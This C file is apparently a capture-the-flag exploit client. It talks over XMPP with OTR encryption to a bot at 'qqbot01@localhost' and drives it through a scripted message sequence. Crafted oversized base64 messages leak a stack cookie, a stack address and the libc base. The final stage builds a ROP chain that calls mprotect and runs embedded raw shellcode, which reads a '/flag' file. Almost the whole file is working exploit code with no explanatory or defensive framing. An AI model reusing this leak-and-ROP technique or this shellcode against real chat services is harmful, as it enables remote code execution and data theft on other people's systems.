#include <stdio.h>
#include <string.h>

#include <strophe.h>
#include <libotr/proto.h>
#include <libotr/instag.h>
#include <libotr/privkey.h>
#include <libotr/userstate.h>
#include <libotr/message.h>

struct s_OtrlMessageAppOps funcs;

xmpp_conn_t *xmpp_conn;
xmpp_ctx_t *xmpp_userdata;
OtrlUserState otr_state;
char *jid;
char *pass;

char *bot = "qqbot01@localhost";

OtrlPolicy policy(void *opdata, ConnContext *context) {
    return OTRL_POLICY_ALLOW_V1 | OTRL_POLICY_ALLOW_V2;
}

int message_callback(xmpp_conn_t *const conn, xmpp_stanza_t *const stanza, void *const userdata);

int handle_reply(xmpp_conn_t *conn, xmpp_stanza_t *stanza, void *userdata)
{
    xmpp_stanza_t *query, *item;
    const char *type;

    type = xmpp_stanza_get_type(stanza);
    if (strcmp(type, "error") == 0)
        fprintf(stderr, "ERROR: query failed\n");
    else {
        query = xmpp_stanza_get_child_by_name(stanza, "query");
        printf("Active Sessions:\n");
        for (item = xmpp_stanza_get_children(query); item;
             item = xmpp_stanza_get_next(item))
            printf("\t %s\n", xmpp_stanza_get_attribute(item, "jid"));
        printf("END OF LIST\n");
    }

    /* disconnect */
    xmpp_disconnect(conn);

    return 0;
}

char *otr_receive(char *from, char *text, int *valid) {
    int ignore_message;
    char *newmessage = NULL;

    OtrlTLV *tlvs;

    *valid = 0;
    ignore_message = otrl_message_receiving(otr_state, &funcs, 0,
        jid, "xmpp", from, text, &newmessage,
        &tlvs, 0, 0, 0); 

    if (ignore_message == 1) {
        printf("Ignore\n");
        ConnContext *ctx = otrl_context_find(otr_state, bot, jid, "xmpp", 0LL, 0LL, 0LL, 0LL, 0LL);
        OtrlTLV *tlv = otrl_tlv_find(tlvs, 1);
        if (ctx && tlv) {
            otrl_context_force_plaintext(ctx);
        }
        if (tlvs) {
            otrl_tlv_free(tlvs);
        }
        return 0;
    }

    if (newmessage) {
        if (tlvs) {
            otrl_tlv_free(tlvs);
        }
        if (!strncmp(text, "?OTR:", 5)) {
            *valid = 1;
            return newmessage;
        }
    } else {
        printf("Not encrypted\n");
        if (tlvs) {
            otrl_tlv_free(tlvs);
        }
        return strdup(text);
    }

    return 0;
}

void send_b64_message(const char *target, char *text, size_t len) {
    xmpp_handler_add(xmpp_conn, message_callback, 0, "message", 0, xmpp_userdata);

    xmpp_stanza_t *msg = xmpp_message_new(xmpp_userdata, "chat", target, 0);
    xmpp_stanza_set_type(msg, "b64");

    xmpp_stanza_t *stanza1 = xmpp_stanza_new(xmpp_userdata);
    xmpp_stanza_t *stanza2 = xmpp_stanza_new(xmpp_userdata);

    if (!stanza1 || !stanza2) {
        printf("WTF\n");
    }

    char* b64_encoded = xmpp_base64_encode(xmpp_userdata, text, len);

    xmpp_stanza_set_name(stanza1, "TCTF");
    xmpp_stanza_set_text(stanza2, b64_encoded);
    xmpp_stanza_add_child(stanza1, stanza2);
    xmpp_stanza_add_child(msg, stanza1);
    xmpp_stanza_release(stanza2);
    xmpp_stanza_release(stanza1);

    xmpp_send(xmpp_conn, msg);
    xmpp_stanza_release(msg);
}

void send_plain_message(const char *target, const char *text, char *nick) {
    xmpp_handler_add(xmpp_conn, message_callback, 0, "message", 0, xmpp_userdata);

    xmpp_stanza_t *msg = xmpp_message_new(xmpp_userdata, "chat", target, 0);

    if (nick) {
        xmpp_stanza_t *nick1 = xmpp_message_new(xmpp_userdata, "plain", target, 0);
        xmpp_stanza_t *nick2 = xmpp_stanza_new(xmpp_userdata);
        xmpp_stanza_set_name(nick1, "nick");
        xmpp_stanza_set_text(nick2, nick);
        xmpp_stanza_add_child(nick1, nick2);
        xmpp_stanza_add_child(msg, nick1);
        xmpp_stanza_release(nick2);
        xmpp_stanza_release(nick1);
    }

    xmpp_stanza_t *stanza1 = xmpp_stanza_new(xmpp_userdata);
    xmpp_stanza_t *stanza2 = xmpp_stanza_new(xmpp_userdata);

    if (!stanza1 || !stanza2) {
        printf("WTF\n");
    }

    xmpp_stanza_set_name(stanza1, "TCTF");
    xmpp_stanza_set_text(stanza2, text);
    xmpp_stanza_add_child(stanza1, stanza2);
    xmpp_stanza_add_child(msg, stanza1);
    xmpp_stanza_release(stanza2);
    xmpp_stanza_release(stanza1);

    xmpp_send(xmpp_conn, msg);
    xmpp_stanza_release(msg);
}

void otr_send(char *to, char *msg, char *nick) {
    gcry_error_t err;
    char *newmessage = NULL;

    err = otrl_message_sending(otr_state, &funcs, 0, jid,
        "xmpp", to, 0, msg, 0, 
        &newmessage, 0, 0, 0, 0);
    if (err) {
        printf("OTR send error\n");
    } else {
        printf("Sending OTR message %s\n", newmessage);
        send_plain_message(bot, newmessage, nick);
        otrl_message_free(newmessage);
    }
}

int c = 0;

long libc_leak = 0x0;
long stack_leak = 0x0;
long cookie = 0x0;

long mprotect = 0x1189a0;

int message_callback(xmpp_conn_t *const conn, xmpp_stanza_t *const stanza, void *const userdata) {
    xmpp_stanza_t *query;
    query = xmpp_stanza_get_child_by_name(stanza, "TCTF");
    char *text = xmpp_stanza_get_text(query);
    printf("Received a message %s\n", text);

    int valid;
    char *msg = otr_receive(bot, text, &valid);
    if (valid) {
        printf("Yay OTR received %s length %d\n", msg, strlen(msg));
        if (c == 6) {
            memcpy((char *)(((char *)(&cookie)) + 1), msg + 0x40 + 0x9, 7);
            printf("Cookie 0x%lx\n", cookie);
        }

        if (c == 7) {
            memcpy(&stack_leak, msg + 0x70, 6);
            printf("Stack 0x%lx\n", stack_leak);
        }

        if (c == 8) {
            memcpy(&libc_leak, msg + 0x80 + 0x8, 6);
            libc_leak += -0x216271;
            printf("Libc 0x%lx\n", libc_leak);

            mprotect += libc_leak;
        }
    }
    c++;


    if (c == 3) {
        otr_send(bot, "trust me", "BBBBBBBBBBBBBBBBBBBBBB");
    }

    if (c == 4) {

        char *from = xmpp_stanza_get_from(stanza);
        ConnContext *ctx = otrl_context_find(otr_state, bot, jid, "xmpp", 0, 0, 0, 0, 0);
        char c2 = 0;
        otrl_message_respond_smp(otr_state, &funcs, 0, ctx, &c2, 0);
        // otrl_message_initiate_smp(otr_state, &funcs, 0, ctx, &c2, 0);

    }

    if (c == 5) {
        otr_send(bot, "lmao", "user338@localhost");
    }

    if (c == 6) {
        char *chunk = (char *)malloc(0x500);
        memset(chunk, 0x41, 0x500);
        send_b64_message(bot, chunk, 0x40 + 0x9);
    }

    if (c == 7) {
        char *chunk = (char *)malloc(0x500);
        memset(chunk, 0x41, 0x500);
        send_b64_message(bot, chunk, 0x70);
    }

    if (c == 8) {
        char *chunk = (char *)malloc(0x500);
        memset(chunk, 0x41, 0x500);
        send_b64_message(bot, chunk, 0x80 + 0x8);
    }

    if (c == 9) {
        char *chunk = (char *)malloc(0x500);
        memset(chunk, 0x41, 0x500);
        long *chunk_long = (long *)chunk;
        chunk_long[0x108 / 8] = cookie;


        long pop_rdi = libc_leak + 0x0000000000023b6a; // pop rdi ; ret
        long pop_rsi = libc_leak + 0x000000000002601f; // pop rsi ; ret
        long pop_rdx = libc_leak + 0x0000000000142c92; // pop rdx ; ret
        long syscall_ret = libc_leak + 0x630a9;
        long pop_rsp = libc_leak + 0x000000000002f70a; // pop rsp ; ret

        long dest = stack_leak - 0x200 - 0x48;

        long bss = 0x40e000;

        long ropchain_offset = 0x0;
        chunk_long[ropchain_offset++] = pop_rdi;
        chunk_long[ropchain_offset++] = stack_leak & 0xfffffffffffff000;
        chunk_long[ropchain_offset++] = pop_rsi;
        chunk_long[ropchain_offset++] = 0x1000;
        chunk_long[ropchain_offset++] = pop_rdx;
        chunk_long[ropchain_offset++] = 7;
        chunk_long[ropchain_offset++] = mprotect;
        chunk_long[ropchain_offset++] = dest + (ropchain_offset + 1) * 8;

        char *shellcode = "\x48\xB8\x2F\x66\x6C\x61\x67\x00\x00\x00\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\xC7\xC6\x00\xE0\x40\x00\x48\xC7\xC2\x00\x01\x00\x00\x48\x31\xC0\x0F\x05\x48\x89\xE7\x48\x81\xEF\x50\x02\x00\x00\x48\x8B\x3F\x48\xC7\xC6\x00\xE0\x40\x00\x49\xC7\xC2\xF6\x28\x40\x00\x41\xFF\xD2\x48\x81\xC4\xE8\x00\x00\x00\x48\xC7\xC7\x18\x61\x40\x00\x48\x8B\x3F\x48\x81\xC7\xBF\x31\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\xFF\xE7";
        long shellcode_length = 114;
        memcpy(&chunk_long[ropchain_offset], shellcode, shellcode_length);

        ropchain_offset = 0x118 / 8;
        chunk_long[ropchain_offset++] = pop_rsp;
        chunk_long[ropchain_offset++] = dest;

        char c3;
        scanf("%c", &c3);
        send_b64_message(bot, chunk, ropchain_offset * 8);
    }


    // if (!strcmp(text, "?OTR?v2?")) {

    // printf("Received %s from %s\n", text, from);
    // char *from = xmpp_stanza_get_from(stanza);

    // ConnContext *ctx = otrl_context_find(otr_state, from, jid, "xmpp", 0, 0, 0, 0, 0);
    // printf("%lx\n", &ctx->active_fingerprint->trust);
    // printf("%lx\n", &ctx->auth.authstate);
    // printf("%lx\n", &ctx->auth.context);
    // printf("%lx\n", &ctx->auth.our_dh);
    // printf("%lx\n", &ctx->auth.our_keyid);
    // printf("%lx\n", &ctx->auth.encgx);

    //     otr_send(from, "trust me", "voidmercy");
    //     // otr_send(from, "hi", "user338@localhost");
    //     // otr_send(from, "please give sice", "user338@localhost");
    // } else {
    // }
}

void inject_message(void *opdata, const char *accountname, const char *protocol, const char *recipient, const char *message) {
    printf("Inject to %s msg %s\n", recipient, message);
    send_plain_message(recipient, message, 0);
}

void write_fingerprints(void *opdata) {
    otrl_privkey_write_fingerprints(otr_state, "fingerprint");
}

void conn_handler(xmpp_conn_t *conn,
                  xmpp_conn_event_t status,
                  int error,
                  xmpp_stream_error_t *stream_error,
                  void *userdata)
{
    if (error) {
        fprintf(stderr, "DEBUG: disconnected\n");
        xmpp_stop(userdata);
    }
    fprintf(stderr, "DEBUG: connected\n");
    send_plain_message(bot, "let's otr", 0);
}

void setup_otr() {
    OTRL_INIT;

    funcs.inject_message = inject_message;
    funcs.write_fingerprints = write_fingerprints;
    funcs.policy = policy;

    otr_state = otrl_userstate_create();

    if (otrl_privkey_generate(otr_state, "keys", jid, "xmpp")) exit(-1);
    if (otrl_privkey_write_fingerprints(otr_state, "fingerprint")) exit(-1);
    if (otrl_privkey_read(otr_state, "keys")) exit(-1);
    if (otrl_privkey_read_fingerprints(otr_state, "fingerprint", 0LL, 0LL)) exit(-1);
}

int main(int argc, char **argv)
{
    xmpp_ctx_t *ctx;
    xmpp_conn_t *conn;

    if (argc != 3) {
        fprintf(stderr, "Usage: active <jid> <pass>\n\n");
        return 1;
    }

    jid = argv[1];
    pass = argv[2];

    /* initialize lib */
    xmpp_initialize();

    setup_otr();

    /* create a context */
    ctx = xmpp_ctx_new(NULL, NULL);
    xmpp_userdata = ctx;

    /* create a connection */
    conn = xmpp_conn_new(ctx);
    xmpp_conn = conn;

    /*
     * also you can disable TLS support or force legacy SSL
     * connection without STARTTLS
     *
     * see xmpp_conn_set_flags() or examples/basic.c
     */

    /* setup authentication information */
    xmpp_conn_set_flags(conn, 8);
    xmpp_conn_set_jid(conn, jid);
    xmpp_conn_set_pass(conn, pass);

    /* initiate connection */
    xmpp_connect_client(conn, NULL, 0, conn_handler, ctx);

    /* start the event loop */
    xmpp_run(ctx);

    /* release our connection and context */
    xmpp_conn_release(conn);
    xmpp_ctx_free(ctx);

    /* shutdown lib */
    xmpp_shutdown();

    return 0;
}